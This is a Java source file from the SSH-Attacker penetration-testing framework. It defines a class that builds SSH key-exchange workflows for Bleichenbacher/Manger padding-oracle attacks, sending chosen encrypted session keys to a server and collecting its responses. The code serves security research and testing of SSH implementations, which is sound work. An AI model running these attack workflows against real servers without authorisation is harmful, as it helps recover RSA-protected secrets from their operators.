/*
 * SSH-Attacker - A Modular Penetration Testing Framework for SSH
 *
 * Copyright 2014-2022 Ruhr University Bochum, Paderborn University, and Hackmanit GmbH
 *
 * Licensed under Apache License 2.0 http://www.apache.org/licenses/LICENSE-2.0
 */
package de.rub.nds.sshattacker.attacks.pkcs1;

import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
import de.rub.nds.sshattacker.core.config.Config;
import de.rub.nds.sshattacker.core.constants.RunningModeType;
import de.rub.nds.sshattacker.core.protocol.ssh1.message.ClientSessionKeyMessage;
import de.rub.nds.sshattacker.core.protocol.ssh1.message.ServerPublicKeyMessage;
import de.rub.nds.sshattacker.core.protocol.transport.message.RsaKeyExchangePubkeyMessage;
import de.rub.nds.sshattacker.core.workflow.WorkflowTrace;
import de.rub.nds.sshattacker.core.workflow.action.ReceiveAction;
import de.rub.nds.sshattacker.core.workflow.action.SendAction;
import de.rub.nds.sshattacker.core.workflow.action.SendMangerSecretAction;
import de.rub.nds.sshattacker.core.workflow.factory.WorkflowConfigurationFactory;
import de.rub.nds.sshattacker.core.workflow.factory.WorkflowTraceType;

/** Utility class for generating attack workflows for Manger style attacks */
public class BleichenbacherWorkflowGenerator {

    /**
     * @param sshConfig SSH config to be used to generate the workflow
     * @param encryptedSecret Encrypted secret to be set in the key exchange's secret message
     * @return A workflow that performs an SSH RSA key exchange up to the secret message + messages
     *     received after the secret message
     */
    public static WorkflowTrace generateWorkflow(Config sshConfig, byte[] encryptedSecret) {
        WorkflowTrace trace =
                new WorkflowConfigurationFactory(sshConfig)
                        .createWorkflowTrace(
                                WorkflowTraceType.KEX_SSH1_ONLY, RunningModeType.CLIENT);

        trace.addSshAction(new ReceiveAction(new ServerPublicKeyMessage()));

        ClientSessionKeyMessage clientSessionKeyMessage = new ClientSessionKeyMessage();
        ModifiableByteArray encryptedSecretArray = new ModifiableByteArray();
        encryptedSecretArray.setModification(
                ByteArrayModificationFactory.explicitValue(encryptedSecret));
        clientSessionKeyMessage.setEncryptedSessioKey(encryptedSecretArray);
        trace.addSshAction(new SendAction(clientSessionKeyMessage));

        return trace;
    }
    /**
     * Generates a dynamic workflow that encrypts the given encoded secret during execution
     *
     * @param sshConfig SSH config to be used to generate the workflow
     * @param encodedSecret The encoded shared secret to be encrypted and send
     * @return A dynamic workflow that performs an SSH RSA key exchange up to the secret message +
     *     messages received after the secret message
     */
    public static WorkflowTrace generateDynamicWorkflow(Config sshConfig, byte[] encodedSecret) {
        WorkflowTrace trace =
                new WorkflowConfigurationFactory(sshConfig)
                        .createWorkflowTrace(
                                WorkflowTraceType.KEX_INIT_ONLY, RunningModeType.CLIENT);
        trace.addSshAction(new ReceiveAction(new RsaKeyExchangePubkeyMessage()));
        trace.addSshAction(new SendMangerSecretAction(encodedSecret));
        trace.addSshAction(new ReceiveAction());
        return trace;
    }

    private BleichenbacherWorkflowGenerator() {}
}
